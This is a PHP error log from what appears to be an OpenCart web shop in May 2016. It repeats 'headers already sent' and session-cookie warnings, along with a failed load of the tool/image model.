2016-05-13 4:23:27 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 4:23:27 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 4:23:27 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 4:23:27 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 4:23:27 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 4:23:27 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 4:23:27 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 4:23:27 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 4:42:14 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 4:42:14 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 4:42:14 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 4:45:08 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 4:45:08 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 4:45:08 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 4:45:08 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 4:45:08 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 5:46:28 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 5:46:28 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 5:46:28 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 5:46:28 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 5:46:28 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 6:30:51 - 
2016-05-13 6:30:51 - 
2016-05-13 6:30:51 - 
2016-05-13 6:30:51 - 
2016-05-13 6:30:51 - 
2016-05-13 6:54:59 - 
2016-05-13 6:54:59 - 
2016-05-13 6:54:59 - 
2016-05-13 6:54:59 - 
2016-05-13 6:54:59 - 
2016-05-13 6:59:02 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 6:59:02 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 6:59:02 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 6:59:02 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 6:59:02 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 7:33:03 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 7:33:03 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 7:33:03 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 7:33:03 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 7:33:03 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 7:48:03 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 7:48:03 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 7:48:03 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 7:48:03 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 7:48:03 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 7:49:06 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 7:49:06 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 7:49:06 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 7:49:06 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 7:49:06 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 8:19:22 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 8:19:22 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 8:19:22 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 8:19:22 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 8:19:22 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 9:35:34 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 9:35:34 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 9:35:34 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 9:53:55 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 9:53:55 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 9:53:55 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 9:53:55 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 9:53:55 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 12:37:54 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 12:37:54 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 12:37:54 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 12:37:54 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 12:37:54 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 12:37:54 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 12:37:54 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 12:37:54 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 12:37:54 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 12:37:54 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 12:37:55 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 12:37:55 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 12:37:55 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 12:37:55 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 12:37:55 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 12:40:15 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 12:40:15 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 12:40:15 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 12:40:15 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 12:40:15 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-13 13:09:57 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 13:09:57 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-13 13:09:57 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-13 13:09:57 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-13 13:09:57 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-20 7:45:21 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-20 7:45:21 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-20 7:45:21 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
